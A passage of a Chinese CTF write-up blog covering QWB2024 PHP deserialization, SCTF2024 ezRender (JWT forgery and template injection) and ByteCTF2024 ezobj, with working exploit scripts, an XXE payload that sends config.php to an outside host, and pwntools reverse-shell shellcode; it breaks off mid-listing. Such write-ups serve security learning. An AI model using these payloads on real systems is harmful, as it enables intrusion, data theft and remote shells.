src="/img/qwb2024/332750B67822FA09000338CA4130DC4E.png" alt="332750B67822FA09000338CA4130DC4E"></p><p>在class root里value被赋值了flag，可以用地址引用，让user里的username取value的地址，就会自动输出flag了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">root</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;2024qwb&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">root</span>();<br><span class="hljs-variable">$a</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>();<br><span class="hljs-variable">$a</span>-&gt;value = &amp;<span class="hljs-variable">$a</span>-&gt;username-&gt;username;      <span class="hljs-comment">//刚开始给username赋值2024qwb，同时value也是2024qwb了，所以就能进入get，然后get给value赋值为flag，username也就是flag了。</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;s:7:\&quot;2024q&quot;</span>,<span class="hljs-string">&quot;S:7:\&quot;2024\\71&quot;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><p>怎么进入get呢？</p><p>最后这里$user-&gt;password，root类里没有password属性，就自动进入get了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$user</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == 0 &amp;&amp; <span class="hljs-variable">$user</span>-&gt;password == <span class="hljs-string">&quot;2024qwb&quot;</span>)&#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>把得到的链子填入上面的python脚本里就能拿到flag。</p><p><img src="/img/qwb2024/image-20241103155109815.png" alt="image-20241103155109815"></p><h1 id="platform"><a href="#platform" class="headerlink" title="platform"></a>platform</h1><p><a href="http://www.zip下载源码/">www.zip下载源码</a></p><p>看了一眼class.php 考点应该是session反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">private</span> <span class="hljs-variable">$sensitiveFunctions</span> = [<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;passthru&#x27;</span>, <span class="hljs-string">&#x27;shell_exec&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;proc_open&#x27;</span>];<br><span class="hljs-variable">$sessionData</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$sessionFile</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;sensitiveFunctions <span class="hljs-keyword">as</span> <span class="hljs-variable">$function</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$sessionData</span>, <span class="hljs-variable">$function</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$sessionData</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$function</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$sessionData</span>);   <span class="hljs-comment">//可以双写绕过</span><br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$sessionFile</span>, <span class="hljs-variable">$sessionData</span>);<br></code></pre></td></tr></table></figure><p>利用过滤进行逃逸控制反序列化内容。字符串逃逸了。</p><p>举个栗子：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=passthrupassthrupassthrupassthrupassthrupassthrupassthru<br><span class="hljs-attribute">password</span>=O:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;notouchitsclass&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;data&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;phpinfo();&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>如果我这样写，那么到sess里的数据会长这样：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">user</span>|s:<span class="hljs-number">56</span>:<span class="hljs-string">&quot;passthrupassthrupassthrupassthrupassthrupassthrupassthru&quot;</span>;session_key|s:<span class="hljs-number">25</span>:<span class="hljs-string">&quot;uz6IWN70l641vlzLjeixuI8CT&quot;</span>;password|s:<span class="hljs-number">56</span>:<span class="hljs-string">&quot;O:15:&quot;</span>notouchitsclass<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>data<span class="hljs-string">&quot;;s:10:&quot;</span>phpinfo();<span class="hljs-string">&quot;;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>经过处理之后，就变成了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">user</span>|s:<span class="hljs-number">56</span>:<span class="hljs-string">&quot;&quot;</span>;session_key|s:<span class="hljs-number">25</span>:<span class="hljs-string">&quot;uz6IWN70l641vlzLjeixuI8CT&quot;</span>;password|s:<span class="hljs-number">56</span>:<span class="hljs-string">&quot;O:15:&quot;</span>notouchitsclass<span class="hljs-string">&quot;:1:&#123;s:4:&quot;</span>data<span class="hljs-string">&quot;;s:10:&quot;</span>phpinfo();<span class="hljs-string">&quot;;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="/img/qwb2024/image-20241103163347648.png" alt="image-20241103163347648"></p><p>如果我能让蓝色部分全部被算在user里，后面剩下的部分我就可控，可以反序列化，只需要在payload前面加;xx|</p><p><code>;</code>是分隔前面的数据，xx是键名随便，<code>|</code>是必要格式。</p><p>现在我的数据就变成了：</p><p><img src="/img/qwb2024/image-20241103163738734.png" alt="image-20241103163738734"></p><p>session_key是随机的，我只需要多发几次包让key的长度与其他脏数据加起来等于56即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://eci-2zeikei7c3gbjdb3tab6.cloudeci1.ichunqiu.com&quot;</span><br><br>data = &#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;passthrupassthrupassthrupassthrupassthrupassthrupassthru&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;;xx|O:15:\&quot;notouchitsclass\&quot;:1:&#123;s:4:\&quot;data\&quot;;s:20:\&quot;syssystemtem(&#x27;/readflag&#x27;);\&quot;;&#125;&quot;</span><br>&#125;         <span class="hljs-comment">#注意双写</span><br>cookies = &#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;aaa&quot;</span>&#125;<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    res = requests.post(url+<span class="hljs-string">&quot;/index.php&quot;</span>,data=data,cookies=cookies)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>        <span class="hljs-built_in">print</span>(res.text)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="/img/qwb2024/image-20241103164639960.png" alt="image-20241103164639960"></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SCTF2024 ezRender</title>
    <link href="/2024/10/07/SCTF2024/"/>
    <url>/2024/10/07/SCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="ezRender"><a href="#ezRender" class="headerlink" title="ezRender"></a>ezRender</h1><p>这道题主要是成为admin，要成为admin就要伪造cookie，要伪造cookie就要获取jwt密钥。</p><p>jwt密钥生成逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name,password</span>):<br>        self.name=name<br>        self.pwd = password<br>        self.Registertime=<span class="hljs-built_in">str</span>(time.time())[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>]<br>        self.handle=<span class="hljs-literal">None</span><br><br>        self.secret=self.setSecret()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params">self</span>):<br>        self.handle = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/random&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)     <span class="hljs-comment">#从/dev/random文件获取一个随机数</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setSecret</span>(<span class="hljs-params">self</span>):<br>        secret = self.Registertime     <span class="hljs-comment">#获取当前时间</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> self.handle == <span class="hljs-literal">None</span>:<br>                self.handler()<br>            secret += <span class="hljs-built_in">str</span>(self.handle.read(<span class="hljs-number">22</span>).<span class="hljs-built_in">hex</span>())  <span class="hljs-comment">#key是时间+随机数</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;this file is not exist or be removed&quot;</span>)<br>        <span class="hljs-keyword">return</span> secret<br></code></pre></td></tr></table></figure><p>时间很好搞定，随机数咋办呢？</p><p>原本我的理解是<strong>通过不断向&#x2F;dev&#x2F;random发送随机数请求，用光熵，它就不会生成随机数了。</strong>这里歪打正着了。</p><p>但其实后面出题人给了提示：<code>ulimit -n =2048</code></p><p>这个值是linux中限制打开文件数量的，也就是说，我每次创建一个新用户，就会打开一次&#x2F;dev&#x2F;random，而这里open没close，文件并不会关闭。一直创建新用户直到两千多个用户时，代码就会因为文件打开数量的限制，而无法打开&#x2F;dev&#x2F;random，也就无法获取随机数，从而这个用户的jwt key只有时间了，我们也就可以把它的身份改成admin从而执行后面的行动。</p><p>在admin路由，可以渲染模版，像49这种纯字符型的模版可以成功渲染，但是需要渲染“高级”一点的代码就不行了，这是因为之前把文件打开数量塞满了，渲染模版的时候需要新打开一个文件，这就导致了阻塞，我们需要删除一些用户，然后来释放一些文件，好让我们的模版可以成功渲染。</p><p>这个题还不出网弹不了shell，内存马没写成功&#x3D;-&#x3D;</p><p>一键获得flag exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://1.95.87.193:39451&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment">#register</span><br>    i = i + <span class="hljs-number">1</span><br>    data = &#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>+<span class="hljs-built_in">str</span>(i),<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123456&quot;</span>&#125;<br>    resregister = requests.post(url+<span class="hljs-string">&#x27;/register&#x27;</span>,json=data)<br>    <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-built_in">print</span>(resregister.text)<br>    timekey = <span class="hljs-built_in">str</span>(time.time())[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>]<br>    <span class="hljs-built_in">print</span>(timekey)<br><br>    <span class="hljs-comment">#login获取cookie</span><br>    reslogin = requests.post(url+<span class="hljs-string">&#x27;/login&#x27;</span>,json=data)<br>    token = json.loads(base64.b64decode(reslogin.cookies[<span class="hljs-string">&#x27;Token&#x27;</span>]))<br>    secret = token[<span class="hljs-string">&#x27;secret&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(secret)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 解码</span><br>        decrypt_infor = jwt.decode(secret, timekey, algorithms=[<span class="hljs-string">&#x27;HS256&#x27;</span>])<br>        <span class="hljs-built_in">print</span>(decrypt_infor)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag&quot;</span>)<br><br>        <span class="hljs-comment">#输出加密后的cookie</span><br>        secret1 = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>+<span class="hljs-built_in">str</span>(i), <span class="hljs-string">&quot;is_admin&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        verify_c = jwt.encode(secret1, timekey, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>        infor = &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>+<span class="hljs-built_in">str</span>(i), <span class="hljs-string">&quot;secret&quot;</span>: verify_c&#125;<br>        token1 = base64.b64encode(json.dumps(infor).encode()).decode()<br>        <span class="hljs-built_in">print</span>(token1)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment">#删除user，释放占用的文件</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">300</span>):<br>    data = &#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>+<span class="hljs-built_in">str</span>(j)&#125;<br>    res = requests.post(url+<span class="hljs-string">&#x27;/removeUser&#x27;</span>,data=data,cookies=&#123;<span class="hljs-string">&quot;Token&quot;</span>:token1&#125;)<br>    <span class="hljs-built_in">print</span>(res.text)<br><br><br>data = &#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;x.__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;ex&#x27;&#x27;ec&#x27;)(\&quot;setattr(__import__(&#x27;sys&#x27;).modules.__getitem__(&#x27;__main__&#x27;).__dict__.__getitem__(&#x27;APP&#x27;.lower()),&#x27;_static_folder&#x27;,&#x27;/&#x27;)\&quot;)&#125;&#125;&quot;</span>&#125;   <span class="hljs-comment">#将static目录污染到根目录</span><br>requests.post(url+<span class="hljs-string">&#x27;/admin&#x27;</span>,data=data,cookies=&#123;<span class="hljs-string">&quot;Token&quot;</span>:token1&#125;)<br><br>data = &#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;g.pop.__globals__.__builtins__.__import__(&#x27;OS&#x27;.lower()).popen(&#x27;/readflag 2&gt;&amp;1 1&gt;/tmp/res.txt&#x27;).read()&#125;&#125;&quot;</span>&#125;    <span class="hljs-comment">#由于它关闭了标准输出，这里将错误输出从定向到res.txt</span><br>requests.post(url+<span class="hljs-string">&#x27;/admin&#x27;</span>,data=data,cookies=&#123;<span class="hljs-string">&quot;Token&quot;</span>:token1&#125;)<br><br>res = requests.get(url+<span class="hljs-string">&#x27;/static/tmp/res.txt&#x27;</span>)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ByteCTF2024大师赛web部分wp</title>
    <link href="/2024/09/21/ByteCTF2024%E5%A4%A7%E5%B8%88%E8%B5%9B/"/>
    <url>/2024/09/21/ByteCTF2024%E5%A4%A7%E5%B8%88%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="ezobj"><a href="#ezobj" class="headerlink" title="ezobj"></a>ezobj</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;On&quot;</span>);<br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&quot;config.php&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;so&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;so&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>] === <span class="hljs-variable">$secret</span>) &#123;<br>        <span class="hljs-title function_ invoke__">array_map</span>(function(<span class="hljs-variable">$file</span>) &#123; <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span> . <span class="hljs-string">&quot;\n&quot;</span>; &#125;, <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&#x27;/tmp/*&#x27;</span>));<br>        <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/tmp/&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;so&#x27;</span>].<span class="hljs-string">&quot;.so&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;byte&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>])) &#123;  <br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;byte&#x27;</span>]);<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">newInstanceArgs</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]);<br>    <span class="hljs-comment">// echo $b;</span><br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;clean&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">&#x27;unlink&#x27;</span>, <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&#x27;/tmp/*&#x27;</span>));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hello ByteCTF2024!&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先需要读取config.php里的$secret</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionClass</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;byte&#x27;</span>]);<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">newInstanceArgs</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]);<br><span class="hljs-comment">// echo $b;</span><br></code></pre></td></tr></table></figure><p>这里是另一种方式的php原生类利用，没有给回显，就可以尝试加载外部实体xml读文件。</p><p>可以看看这篇文章：<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/">任意代码执行下的php原生类利用</a></p><p>evil1.xml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;  <br>&lt;!DOCTYPE ANY[  <br>&lt;!ENTITY % remote SYSTEM &quot;http://47.108.89.135/evils/send.xml&quot;&gt;  <br>%remote;  <br>%all;  <br>%send;  <br>]&gt;<br></code></pre></td></tr></table></figure><p>send.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=config.php&quot;</span>&gt;</span> <br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://47.108.89.135/send.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?byte=SimpleXMLElement<span class="hljs-meta">&amp;ctf[]=http:<span class="hljs-comment">//47.108.89.135/evils/evil1.xml</span></span><br></code></pre></td></tr></table></figure><p>读到$secret&#x3D;HelloByteCTF2024</p><p>然后我们需要在&#x2F;tmp里写纯数字的so文件，php会把它加入环境变量，可以通过某种方式加载这个so来执行命令。</p><p>可以通过<a href="https://aecous.github.io/2023/06/27/Imagick%E8%A7%A6%E5%8F%91msl/">Imagick触发msl</a></p><p>evil2.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;inline:data:text/8BIM;base64,base64编码后的so文件&quot;</span> /&gt;</span> <br> <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;/tmp/123.so&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">运行这个可以在/tmp里写进去你原模原样的evil2.xml，而且文件名是随机的：<br>?byte=Imagick&amp;ctf[]=http://47.108.89.135/evils/evil2.xml<br>然后再运行这个，可以解析tmp目录下的所有xml文件，就会生成123.so了，而且内容是<span class="hljs-built_in">base64</span>解码之后的so<br>byte=Imagick&amp;ctf[]=vid:msl:/tmp/*<br></code></pre></td></tr></table></figure><p>直接这样写不进去直接用C语言编译的so文件，可能是文件过大的原因，这里请求pwn师傅写了一个手搓so文件的脚本，用这个脚本生成的代码去编译生成的so会很小。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment"># 目标地址和端口</span><br>target_ip = <span class="hljs-string">&quot;47.108.89.135&quot;</span><br>target_port = <span class="hljs-number">2333</span><br><br>connect_code = shellcraft.connect(target_ip, target_port)<br>dup_shell_code = shellcraft.dupsh()<br>full_code = connect_code + dup_shell_code<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;C:\Users\13664\Desktop\test.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(full_code)<br></code></pre></td></tr></table></figure><p><a href="https://blingblingxuanxuan.github.io/2024/01/29/240129-the-smallest-elf/">https://blingblingxuanxuan.github.io/2024/01/29/240129-the-smallest-elf/</a></p><p>然后把生成的东西覆盖掉_start:的内容，把注释和关键字删去。</p><p>恶意so文件内容：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 